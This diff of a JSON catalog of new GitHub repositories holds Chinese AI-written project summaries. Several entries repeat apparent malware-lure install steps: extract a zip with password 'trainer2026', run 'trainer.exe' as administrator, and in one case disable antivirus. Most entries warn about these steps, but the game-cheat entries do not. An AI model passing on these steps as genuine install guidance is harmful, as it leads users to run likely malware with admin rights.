@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-07-02T05:40:15.017Z",
+  "updatedAt": "2026-07-03T05:35:34.263Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -59373,6 +59373,619 @@
         "category": "AI Agent"
       },
       "analyzedAt": "2026-07-02T05:40:15.002Z"
+    },
+    {
+      "owner": "LunaGeller",
+      "repo": "competitor-analysis-skill",
+      "fullName": "LunaGeller/competitor-analysis-skill",
+      "description": "中文 Codex Skill：生成结构化竞品研究和机会判断报告",
+      "language": "Unknown",
+      "topics": [
+        "chinese",
+        "codex",
+        "competitive-analysis",
+        "market-research",
+        "skill",
+        "strategy"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-07-03T02:30:58Z",
+      "url": "https://github.com/LunaGeller/competitor-analysis-skill",
+      "analysis": {
+        "positioning": "为Codex生成结构化竞品分析报告。",
+        "useCases": [
+          "你做产品研究 → 它帮你对比竞品定位、功能、定价、渠道和客户声音",
+          "你做市场进入分析 → 它帮你洞察竞争格局、机会与威胁",
+          "你做销售战卡 → 它帮你提炼竞品差异、客户痛点与攻防话术"
+        ],
+        "audience": "需要快速、结构化生成竞品分析报告的产品经理、市场、销售、创业者和投资者。",
+        "quickStart": {
+          "prerequisites": "已安装Codex环境",
+          "steps": [
+            "克隆项目到Codex技能目录",
+            "在Codex中调用$competitor-analysis"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "手动竞品分析",
+            "method": "人工收集、整理与分析",
+            "models": "人脑",
+            "pricing": "时间/人力成本"
+          },
+          {
+            "name": "通用AI聊天（如ChatGPT）",
+            "method": "自由文本提问，自定义输出",
+            "models": "GPT-4等",
+            "pricing": "部分免费/订阅"
+          }
+        ],
+        "pricing": "免费 (依托Codex平台)",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "文档详尽，设计清晰，提供结构化分析框架与输出模板，具备实用价值，但社区活跃度较低。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，尚无 Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-03T05:31:01.833Z"
+    },
+    {
+      "owner": "lxj960202-jerry",
+      "repo": "system-info-skill",
+      "fullName": "lxj960202-jerry/system-info-skill",
+      "description": "跨平台、只读、隐私优先的本机配置查询 Codex Skill",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-03T01:59:03Z",
+      "url": "https://github.com/lxj960202-jerry/system-info-skill",
+      "analysis": {
+        "positioning": "跨平台、隐私优先的本机配置查询AI助手",
+        "useCases": [
+          "你想快速了解电脑配置 → 它帮你生成一份易读的Markdown报告",
+          "你需要分享电脑硬件信息给他人 → 它帮你生成脱敏的、专业的报告",
+          "你想知道电脑是否适合特定任务（如编程、AI）→ 它提供配置数据并给出初步解读",
+          "你只想查询特定硬件信息（如CPU、内存）→ 它根据你的提问只返回所需部分"
+        ],
+        "audience": "寻求便捷、隐私地查询并理解电脑配置的普通用户、开发者，或需要AI辅助管理硬件信息的人群。",
+        "quickStart": {
+          "prerequisites": "Git, Python 3.9+, Codex环境 (作为Codex Skill使用时)",
+          "steps": [
+            "克隆仓库到Codex skills目录: `git clone https://github.com/lxj960202-jerry/system-info-skill.git \"${CODEX_HOME:-$HOME/.codex}/skills/system-info-skill\"`",
+            "通过自然语言或命令向Codex提问，例如：`我的电脑配置是什么？`"
+          ],
+          "note": "null"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目定位清晰，README详尽专业，流程图和功能表格一目了然。支持多平台，强调隐私，提供了AI集成和独立脚本两种使用方式，对普通用户友好。唯一的不足是Star数较少，可能处于早期阶段。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前Issue开启和关闭均为0，暂无用户互动记录。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-03T05:31:19.352Z"
+    },
+    {
+      "owner": "gjbjzyvivian-netizen",
+      "repo": "travel-planner",
+      "fullName": "gjbjzyvivian-netizen/travel-planner",
+      "description": "逐步问清偏好，生成可直接照着走的逐日旅行行程表（含餐饮/交通/预算/打包清单）—— 一个 Claude Code Skill",
+      "language": "Unknown",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-03T02:06:26Z",
+      "url": "https://github.com/gjbjzyvivian-netizen/travel-planner",
+      "analysis": {
+        "positioning": "专为Claude Code设计的AI旅行规划Skill，通过多轮问答生成可执行的逐日行程。",
+        "useCases": [
+          "你模糊地说想去哪玩几天 → 它帮你生成含餐饮/交通/预算/打包清单的逐日行程",
+          "你想做旅行计划但细节说不清、攻略零散 → 它通过多轮问答帮你把模糊想法落实成可执行行程",
+          "你想拍板去哪、玩什么、花多少 → 它负责追问和推荐怎么排，帮你把规划落到实处"
+        ],
+        "audience": "适合不想自己从头做攻略、喜欢互动式规划、并使用Claude Code的旅行者。",
+        "quickStart": {
+          "prerequisites": "拥有Claude Code环境",
+          "steps": [
+            "克隆项目到 ~/.claude/skills/travel-planner",
+            "在Claude Code中直接说出旅行需求，例如「帮我规划一下去京都的行程」"
+          ],
+          "note": "仅限Claude Code平台。"
+        },
+        "competitors": [],
+        "pricing": "免费（开源MIT许可证），但使用时需依赖Claude Code平台。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为Claude Code Skill，它通过Git克隆安装，其定义和模板文件（SKILL.md, itinerary-template.md）是核心实现，是编程实现的功能扩展。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue区暂无活动（开启0/关闭0），社区活跃度有待观察。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-03T05:31:35.843Z"
+    },
+    {
+      "owner": "lxj960202-jerry",
+      "repo": "write-vibe-coding-prd",
+      "fullName": "lxj960202-jerry/write-vibe-coding-prd",
+      "description": "将需求、原始 PRD、竞品分析转成 Claude Code / Codex 可直接执行的 Vibe Coding PRD",
+      "language": "Unknown",
+      "topics": [
+        "claude-code",
+        "codex-skill",
+        "prd",
+        "product-requirements",
+        "vibe-coding"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-07-03T02:15:35Z",
+      "url": "https://github.com/lxj960202-jerry/write-vibe-coding-prd",
+      "analysis": {
+        "positioning": "将各类需求文档转化为AI编码Agent可直接执行的PRD。",
+        "useCases": [
+          "你有一个模糊的需求想法 → 它帮你通过交互澄清，并输出可执行PRD",
+          "你有一份传统PRD、竞品分析或飞书文档 → 它帮你提炼成AI编码Agent可直接理解和实现的需求文档",
+          "你正在设计AI产品 → 它帮你将产品想法转化为Agent工作流、Prompt和Tool明细"
+        ],
+        "audience": "产品经理、创业者和研发团队，他们希望将零散需求快速转化为AI编码Agent可直接开发、验收的结构化PRD。",
+        "quickStart": {
+          "prerequisites": "已安装Git和Codex环境",
+          "steps": [
+            "克隆项目到本地：git clone https://github.com/lxj960202-jerry/write-vibe-coding-prd.git",
+            "将Skill复制到Codex目录：cp -R write-vibe-coding-prd/write-vibe-coding-prd ~/.codex/skills/",
+            "重新打开Codex会话后即可使用"
+          ],
+          "note": "适用于本地Codex环境安装"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "专为Claude Code / Codex等AI编码Agent设计，将非结构化需求转化为AI可直接执行、验收的精简PRD，是Vibe Coding工作流的关键前置工具。",
+        "isVibeCoding": true,
+        "communityActivity": "项目刚起步，Issue 统计显示社区活跃度暂未显现。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-03T05:31:49.993Z"
+    },
+    {
+      "owner": "juniliu0314-spec",
+      "repo": "speech-transcript-clean-qa",
+      "fullName": "juniliu0314-spec/speech-transcript-clean-qa",
+      "description": "语音转文字稿件清洗与面试 Q&A 拆分工作流，将原始转写内容整理为 Markdown 笔记，并进一步生成可复习、可面试使用的问答资料。",
+      "language": "Unknown",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-03T01:39:43Z",
+      "url": "https://github.com/juniliu0314-spec/speech-transcript-clean-qa",
+      "analysis": {
+        "positioning": "语音转文字稿件清洗与面试问答资料自动化工作流",
+        "useCases": [
+          "你上完课程录音 → 它帮你整理成结构化Markdown学习笔记",
+          "你获得培训转写稿 → 它帮你提炼成可复习、口语化的面试问答",
+          "你有产品讨论或项目复盘转写 → 它帮你生成可直接用于讲解的话术资料"
+        ],
+        "audience": "适合需要将语音转文字内容高效整理为学习笔记、面试准备或知识文档的产品经理、学习者和专业人士。",
+        "quickStart": {
+          "prerequisites": "需要有原始的.docx/.txt/.md格式语音转文字稿件",
+          "steps": [
+            "将原始转写稿件放入项目指定目录（例如：`项目根目录/`）。",
+            "执行第一阶段清洗，删除冗余内容并结构化为Markdown笔记，输出至`cleaned/`目录。",
+            "执行第二阶段Q&A拆分，基于清洗后的笔记生成口语化问答资料，输出至`qa/`目录。"
+          ],
+          "note": "该项目描述的是一套工作流规范，具体实现需自行编码或使用相关工具完成。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "这是一个实用性很强的工具性项目，专注于解决特定场景下的痛点，而非追求新颖或试验性效果。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计为0开0闭，社区活跃度极低。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-07-03T05:32:03.882Z"
+    },
+    {
+      "owner": "subairnifras",
+      "repo": "Audio_Equalizer__System-wide_",
+      "fullName": "subairnifras/Audio_Equalizer__System-wide_",
+      "description": "System-wide audio equalizer with presets for music, movies, gaming, and custom bands. Enhance your sound experience.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:11:07Z",
+      "url": "https://github.com/subairnifras/Audio_Equalizer__System-wide_",
+      "analysis": {
+        "positioning": "系统级音效均衡器，预设加自定义，全面提升音乐、电影、游戏体验。",
+        "useCases": [
+          "你听音乐、看电影 → 它帮你一键优化音效，带来沉浸式体验",
+          "你玩游戏 → 它帮你精准调节声场，听声辨位更清晰",
+          "你追求个性化音质 → 它帮你自定义10段EQ曲线，保存专属预设"
+        ],
+        "audience": "注重Windows系统音质，希望通过预设或自定义调节来提升听觉体验的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)系统",
+          "steps": [
+            "点击下载链接获取压缩包",
+            "使用密码 `trainer2026` 解压文件",
+            "以管理员身份运行 `trainer.exe`",
+            "启动应用，等待加载",
+            "按 `INSERT` 或 `F1` 键打开菜单并启用功能"
+          ],
+          "note": "安装包名为`trainer.exe`，且需输入密码解压，与其宣称的Python项目有明显差异，建议谨慎下载使用。"
+        },
+        "competitors": [
+          {
+            "name": "Equalizer APO + Peace GUI",
+            "method": "安装驱动级APO，配合Peace GUI界面调节",
+            "models": "系统级音频处理",
+            "pricing": "免费"
+          },
+          {
+            "name": "FXSound",
+            "method": "安装专业音效增强软件",
+            "models": "系统级音频处理",
+            "pricing": "付费（有免费试用）"
+          }
+        ],
+        "pricing": "免费。但注意其安装方式与Python项目不符，且包含密码解压的exe文件，存在潜在风险。",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目在GitHub上声称是Python项目，但提供的下载链接却是一个名为`trainer.exe`的压缩包，需要密码`trainer2026`解压运行。这与正常Python应用发布方式严重不符，更像游戏修改器或捆绑软件的发行方式，存在极高的安全风险和信任问题。代码库与实际分发物之间存在严重矛盾。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计显示0开0闭，社区活跃度极低，几乎没有用户互动或问题解决记录。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:33:07.805Z"
+    },
+    {
+      "owner": "sagarbabu9",
+      "repo": "Docker_Container_Manager",
+      "fullName": "sagarbabu9/Docker_Container_Manager",
+      "description": "Manage Docker containers, images, volumes, and networks with a simple GUI. Start, stop, restart, and view logs. Perfect for local development.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:14:07Z",
+      "url": "https://github.com/sagarbabu9/Docker_Container_Manager",
+      "analysis": {
+        "positioning": "Docker容器桌面GUI管理工具，尤其适合本地开发。",
+        "useCases": [
+          "你想可视化管理Docker容器 → 它提供桌面GUI，方便启动、停止、重启和查看日志。",
+          "你需要快速管理Docker镜像、卷和网络 → 它提供统一界面，帮你浏览和操作。",
+          "你在本地开发中使用Docker Compose → 它支持从UI运行docker-compose，简化操作。"
+        ],
+        "audience": "Windows本地开发者，希望通过图形界面高效管理Docker容器及相关资源。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64-bit)",
+          "steps": [
+            "点击README中的下载按钮，获取压缩包。",
+            "使用密码`trainer2026`解压ZIP文件。",
+            "以管理员身份运行`trainer.exe`。"
+          ],
+          "note": "注意：安装流程与典型的Python项目安装方式完全不符，涉及下载`.zip`压缩包并运行带有'trainer'字样的可执行文件，这可能存在安全风险或文档误用问题。"
+        },
+        "competitors": [
+          {
+            "name": "Docker Desktop GUI",
+            "method": "集成在Docker Desktop中",
+            "models": "管理基础容器、镜像、卷、网络",
+            "pricing": "免费"
+          },
+          {
+            "name": "Portainer",
+            "method": "Web界面部署",
+            "models": "全面管理Docker、Kubernetes、Swarm",
+            "pricing": "免费社区版，付费企业版"
+          }
+        ],
+        "pricing": "免费，MIT许可。",
+        "vibeCodingScore": 2,
+        "vibeCodingReason": "项目核心功能（Docker GUI管理）有其应用价值，且为MIT许可。然而，README中的安装指南与典型的Python项目安装方式严重不符，指引用户下载并运行名称为“trainer”的`.exe`可执行文件，并需要输入密码解压。这种分发和安装方式具有高度不确定性和潜在安全风险，极大地损害了用户信任和项目可靠性。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue区无任何活动。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-07-03T05:33:31.210Z"
+    },
+    {
+      "owner": "mariusboiti",
+      "repo": "Clipboard_Sync",
+      "fullName": "mariusboiti/Clipboard_Sync",
+      "description": "Sync clipboard content across multiple devices (PC, Android, iOS) via cloud. Share text, images, and files instantly.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:12:59Z",
+      "url": "https://github.com/mariusboiti/Clipboard_Sync",
+      "analysis": {
+        "positioning": "跨设备云同步剪贴板工具，支持文本、图片、文件。",
+        "useCases": [
+          "你在PC上复制了文本或图片 → 它帮你立即在手机上粘贴使用。",
+          "你在手机上截屏或复制文件 → 它帮你直接在PC上编辑或管理。",
+          "你需要在不同设备间安全传输数据 → 它提供端到端加密的云同步方案。"
+        ],
+        "audience": "多设备（PC、Android、iOS）用户，需要高效、安全地同步剪贴板内容。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)",
+          "steps": [
+            "点击链接下载压缩包。",
+            "使用密码 `trainer2026` 解压ZIP文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用并等待加载。",
+            "按 `INSERT` 或 `F1` 打开菜单。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Paste",
+            "method": "专用应用",
+            "models": "macOS/iOS",
+            "pricing": "部分免费/付费"
+          },
+          {
+            "name": "KDE Connect",
+            "method": "专用应用",
+            "models": "Linux/Android",
+            "pricing": "免费（开源）"
+          },
+          {
+            "name": "微软云剪贴板",
+            "method": "系统内置",
+            "models": "Windows 10/11",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目安装步骤提及'trainer.exe'、'trainer2026'密码及要求管理员权限，与剪贴板同步工具的性质严重不符，极度可疑，存在潜在安全风险。",
+        "isVibeCoding": true,
+        "communityActivity": "非常不活跃，Issue 统计为开启0/关闭0，几乎没有社区交流记录。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:33:47.498Z"
+    },
+    {
+      "owner": "dev-shamsali",
+      "repo": "Evade_-_Auto-Dodge___ESP",
+      "fullName": "dev-shamsali/Evade_-_Auto-Dodge___ESP",
+      "description": "Auto-dodge and ESP for Evade, the 3D nextbots survival game with 8.7 billion visits[reference:24]. Automatically dodge nextbots, see them through walls, and survive every round.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:15:09Z",
+      "url": "https://github.com/dev-shamsali/Evade_-_Auto-Dodge___ESP",
+      "analysis": {
+        "positioning": "为《Evade》游戏提供自动躲避和透视，助你轻松生存。",
+        "useCases": [
+          "你在玩《Evade》时被Nextbots追杀 → 它帮你自动躲避，避免死亡。",
+          "你想知道Nextbots在哪 → 它帮你透视，穿墙看到它们的位置。",
+          "你想在游戏中快速移动或挂机 → 它帮你加速、无限体力，甚至反AFK。"
+        ],
+        "audience": "《Evade》游戏的玩家，想在游戏中获得优势、提高生存率或解放双手。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)操作系统，目标游戏《Evade》已安装并运行。",
+          "steps": [
+            "点击下载链接获取压缩包，用密码`trainer2026`解压。",
+            "以管理员身份运行`trainer.exe`，启动游戏，然后按`INSERT`或`F1`激活菜单。"
+          ],
+          "note": "仅支持Windows平台，可能需临时关闭杀毒软件以防误报。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "这是一个游戏修改工具（作弊器），通常不属于开放、协作或创新性开发范畴，而是针对特定游戏进行逆向工程或漏洞利用。",
+        "isVibeCoding": false,
+        "communityActivity": "Issue 统计为0，社区活跃度极低或不通过GitHub Issue进行交流。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:34:00.183Z"
+    },
+    {
+      "owner": "fadilr8",
+      "repo": "Bluesky_Auto-Reply___Like_Bot",
+      "fullName": "fadilr8/Bluesky_Auto-Reply___Like_Bot",
+      "description": "Automatically like and reply to posts on Bluesky. Boost engagement and connect with other users.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:12:05Z",
+      "url": "https://github.com/fadilr8/Bluesky_Auto-Reply___Like_Bot",
+      "analysis": {
+        "positioning": "Bluesky社交平台自动化工具，提升用户互动。",
+        "useCases": [
+          "你希望提升Bluesky帖子曝光 → 它帮你自动点赞目标动态。",
+          "你希望自动化回复Bluesky互动 → 它帮你用模板自动回复特定关键词动态。",
+          "你希望高效管理Bluesky互动时间 → 它帮你按计划自动执行点赞和回复操作。"
+        ],
+        "audience": "希望在Bluesky上自动化提升影响力、扩大互动范围的个人用户或营销人员。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)操作系统。",
+          "steps": [
+            "点击下载链接获取压缩包。",
+            "使用密码 `trainer2026` 解压文件。",
+            "以管理员身份运行 `trainer.exe`。",
+            "启动应用，等待加载，按 `INSERT` 或 `F1` 键打开菜单并启用功能。"
+          ],
+          "note": "项目声称是Python开发，但安装流程是下载带密码的Windows可执行文件并运行，这与标准的Python项目安装方式存在显著差异，请用户谨慎操作，注意潜在的安全风险。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述为Python语言，但实际分发的是一个需要密码解压的Windows可执行文件（`trainer.exe`），这种方式对于开源项目而言极不规范且存在巨大安全隐患，严重影响信任度。同时，拥有259个Star却没有一个公开Issue也令人存疑。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，没有任何公开的Issue讨论或报告。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:34:17.206Z"
+    },
+    {
+      "owner": "Kr3n3r",
+      "repo": "ARC_Raiders_ESP___Aimbot",
+      "fullName": "Kr3n3r/ARC_Raiders_ESP___Aimbot",
+      "description": "ESP, aimbot, and radar hack for ARC Raiders (upcoming). See enemies, loot, and objectives through walls. Dominate the battlefield.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:11:06Z",
+      "url": "https://github.com/Kr3n3r/ARC_Raiders_ESP___Aimbot",
+      "analysis": {
+        "positioning": "ARC Raiders游戏作弊工具，提供透视、自瞄、雷达等功能。",
+        "useCases": [
+          "你玩ARC Raiders想知晓敌人位置 → 它帮你透视敌军、战利品和任务目标。",
+          "你玩ARC Raiders想提升射击精度 → 它帮你自动瞄准并消除枪械后座力。",
+          "你玩ARC Raiders想发现稀有物品 → 它帮你高亮显示高价值战利品。"
+        ],
+        "audience": "寻求在《ARC Raiders》游戏中获得不正当竞争优势的玩家。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 操作系统，待发售的《ARC Raiders》游戏。",
+          "steps": [
+            "下载压缩包并用密码`trainer2026`解压。",
+            "以管理员身份运行`trainer.exe`，启动游戏，等待加载。",
+            "按`INSERT`或`F1`键打开作弊菜单并启用功能。"
+          ],
+          "note": "需管理员权限运行，下载密码已提供。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为游戏作弊工具，旨在提供不正当优势，可能违反游戏公平性原则，且存在被检测封号风险。开发更多侧重于功能实现，而非普适性或维护性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计为0/0，表明在GitHub上社区互动或问题反馈不活跃。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:34:28.541Z"
+    },
+    {
+      "owner": "kishorekarthck",
+      "repo": "Discord_Server_Backup___Archive_Tool",
+      "fullName": "kishorekarthck/Discord_Server_Backup___Archive_Tool",
+      "description": "Backup entire Discord servers: save channels, messages, files, and member list. Archive your community data securely.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:13:52Z",
+      "url": "https://github.com/kishorekarthck/Discord_Server_Backup___Archive_Tool",
+      "analysis": {
+        "positioning": "一键备份整个Discord服务器，确保社区数据安全。",
+        "useCases": [
+          "你运营Discord社区 → 它帮你完整备份频道、消息、文件和成员列表，以防数据丢失。",
+          "你需要迁移或归档Discord社区 → 它帮你导出所有内容和成员列表，便于重建或长期保存。",
+          "你担心服务器内容丢失 → 它帮你定时自动备份，并支持将备份恢复到新服务器。"
+        ],
+        "audience": "Discord社区管理员或任何担心数据丢失的用户，希望安全归档服务器内容。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)",
+          "steps": [
+            "点击下载链接获取压缩包",
+            "使用密码 `trainer2026` 解压文件",
+            "以管理员身份运行 `trainer.exe`",
+            "启动应用后按 `INSERT` 或 `F1` 打开功能菜单"
+          ],
+          "note": "仅支持Windows平台，安装流程特殊（使用trainer.exe和特定密码），存在潜在安全风险，请谨慎操作。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述为Discord备份工具，但实际下载链接、解压密码、可执行文件名称（`trainer.exe`）及操作方式（打开`trainer菜单`）均与游戏修改器或恶意软件特征高度吻合，与声称的功能严重不符，存在极高安全风险，不建议使用。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue区完全空白，社区活跃度极低。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:34:42.152Z"
+    },
+    {
+      "owner": "31harihhh-jkn",
+      "repo": "DNS_Benchmark_Tool",
+      "fullName": "31harihhh-jkn/DNS_Benchmark_Tool",
+      "description": "Test and benchmark DNS servers to find the fastest one for your location. Improve your internet browsing speed.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-01T09:13:56Z",
+      "url": "https://github.com/31harihhh-jkn/DNS_Benchmark_Tool",
+      "analysis": {
+        "positioning": "快速找到并优化你本地最快的DNS服务器，提升上网速度。",
+        "useCases": [
+          "你感觉上网卡顿 → 它帮你找到最快的DNS，让网页秒开。",
+          "你想对比不同DNS的性能 → 它帮你生成对比表格，直观选优。",
+          "你想自动获得最佳DNS配置 → 它帮你自动测试并推荐最快的DNS。"
+        ],
+        "audience": "追求更快上网速度的Windows 10/11用户，尤其是对网络延迟敏感的游戏玩家或高清视频观众。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)",
+          "steps": [
+            "点击README中的下载按钮下载压缩包",
+            "使用密码`trainer2026`解压ZIP文件",
+            "以管理员身份运行`trainer.exe`",
+            "启动应用程序并等待加载",
+            "按`INSERT`或`F1`键打开修改器菜单并启用所需功能"
+          ],
+          "note": "注意：项目描述为DNS工具，但下载和安装步骤（运行`trainer.exe`，使用密码`trainer2026`，打开修改器菜单）强烈指向一个游戏修改器（trainer）。请谨慎使用，并注意潜在的安全风险。"
+        },
+        "competitors": [
+          {
+            "name": "DNSBench (GRC)",
+            "method": "桌面GUI工具",
+            "models": "N/A",
+            "pricing": "免费"
+          },
+          {
+            "name": "Namebench (Google)",
+            "method": "桌面GUI/CLI工具",
+            "models": "N/A",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目描述（DNS工具）与安装指南（`trainer.exe`、解压密码`trainer2026`、修改器菜单）严重不符。这种矛盾极具误导性，强烈暗示项目可能并非其声称的工具，存在潜在的恶意行为或误用风险。安全隐患极高。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue区（0开/0关）无任何活动，缺乏社区支持和反馈。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-03T05:34:58.073Z"
+    },
+    {
+      "owner": "alibaba",
+      "repo": "open-code-review",
+      "fullName": "alibaba/open-code-review",
+      "description": "Open-source & free — Battle-tested at Alibaba's scale. Hybrid architecture code review tool: deterministic pipelines + LLM Agent, precise line-level comments, built-in fine-tuned ruleset (NPE, thread-safety, XSS, SQL injection), OpenAI & Anthropic compatible.",
+      "language": "Go",
+      "topics": [
+        "agent",
+        "agent-skills",
+        "code-review",
+        "code-review-assistant",
+        "harness",
+        "repository-level-context"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-18T02:16:36Z",
+      "url": "https://github.com/alibaba/open-code-review",
+      "analysis": {
+        "positioning": "阿里开源，AI驱动的混合架构代码审查CLI工具。",
+        "useCases": [
+          "你提交代码 → 它帮你自动审查并给出精准行级修改建议。",
+          "你担忧代码质量 → 它帮你发现NPE、线程安全、XSS、SQL注入等常见缺陷。",
+          "你希望提升开发效率 → 它为你提供阿里大规模验证过的AI代码审查能力。"
+        ],
+        "audience": "开发者、技术团队及追求高质量代码的组织，尤其适合希望利用AI提升代码审查效率和准确性的场景。",
+        "quickStart": {
+          "prerequisites": "一个OpenAI或Anthropic兼容的LLM模型服务接口。",
+          "steps": [
+            "安装Open Code Review CLI工具",
+            "配置LLM模型服务接口"
+          ],
+          "note": "支持Windows, macOS, Linux三大主流操作系统。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "阿里内部大规模验证的开源AI代码审查工具，融合确定性流程与LLM Agent，提供精准行级注释和预设规则集，Go语言实现，功能强大且稳定。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue关闭率较高（39开启/71关闭），项目维护活跃。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-03T05:35:34.237Z"
     }
   ]
 }
